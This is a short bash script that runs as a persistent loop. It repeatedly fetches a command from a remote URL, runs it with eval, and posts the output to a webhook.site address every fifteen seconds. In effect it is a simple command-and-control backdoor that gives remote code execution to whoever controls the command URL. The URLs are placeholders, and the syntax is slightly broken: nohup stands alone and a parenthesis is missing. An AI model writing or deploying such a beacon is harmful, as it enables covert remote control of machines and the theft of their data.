#!/bin/bash
nohup
while :
do
req=$(curl "https://(plain text command_url)"
cmd="$req" # You need double quotes to get your $count value substituted.
curl -X POST -d "$(eval $cmd)" "https://(webhook.site link)"
sleep 15
done
